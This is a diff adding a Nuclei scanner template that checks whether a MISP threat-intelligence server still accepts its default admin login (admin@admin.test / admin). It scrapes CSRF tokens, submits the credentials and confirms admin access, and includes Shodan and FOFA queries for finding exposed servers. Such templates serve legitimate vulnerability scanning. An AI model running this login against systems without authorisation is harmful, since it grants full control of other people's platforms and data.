@@ -1,0 +1,87 @@
+id: misp-default-login
+
+info:
+  name: MISP - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    MISP creates its first Site Admin account admin@admin.test with the password admin when the instance is initialised, and the official misp-docker image keeps this password unless ADMIN_PASSWORD is set. An attacker who logs in with these credentials gains full control over the threat intelligence platform, including all events and attributes, sharing groups, sync server connections, API keys, users and server settings.
+  reference:
+    - https://github.com/MISP/MISP/blob/v2.5.52/app/Model/User.php
+    - https://github.com/MISP/misp-docker/blob/master/template.env
+    - https://github.com/MISP/misp-docker/blob/master/core/files/configure_misp.sh
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+    cpe: cpe:2.3:a:misp:misp:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    vendor: misp
+    product: misp
+    shodan-query: http.title:"Users - MISP"
+    fofa-query: title="Users - MISP"
+  tags: misp,default-login,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /users/login HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(body, "<title>Users - MISP</title>", "id=\"UserLoginForm\"", "data[_Token][key]")'
+        condition: and
+        internal: true
+
+    extractors:
+      - type: regex
+        name: token_key
+        part: body
+        group: 1
+        regex:
+          - 'name="data\[_Token\]\[key\]" value="([^"]+)"'
+        internal: true
+
+      - type: regex
+        name: token_fields
+        part: body
+        group: 1
+        regex:
+          - 'name="data\[_Token\]\[fields\]" value="([^"]+)"'
+        internal: true
+
+  - raw:
+      - |
+        POST /users/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{BaseURL}}/users/login
+
+        _method=POST&data%5B_Token%5D%5Bkey%5D={{token_key}}&data%5BUser%5D%5Bemail%5D={{url_encode(username)}}&data%5BUser%5D%5Bpassword%5D={{password}}&data%5B_Token%5D%5Bfields%5D={{url_encode(token_fields)}}&data%5B_Token%5D%5Bunlocked%5D=
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin@admin.test
+      password:
+        - admin
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 302'
+          - 'regex("(?mi)^set-cookie:\\s*MISP-[0-9a-f-]{36}=", header)'
+          - 'regex("(?mi)^location:\\s*(https?://[^/\\s]+)?(/[^?#\\s]*)?/users/routeafterlogin\\s*$", header)'
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - username + ":" + password
+# digest: 490a004630440220016f8bf3cc5f8392c0cef3fefe1cc3b7453a6a1bd82b94fac22bee399230d08d02200eddf28fe1af0ecd39394b15550388d78231529fab98ecbb34d25ffa0bf2e7b6:922c64590222798bb761d5b6d8e72950
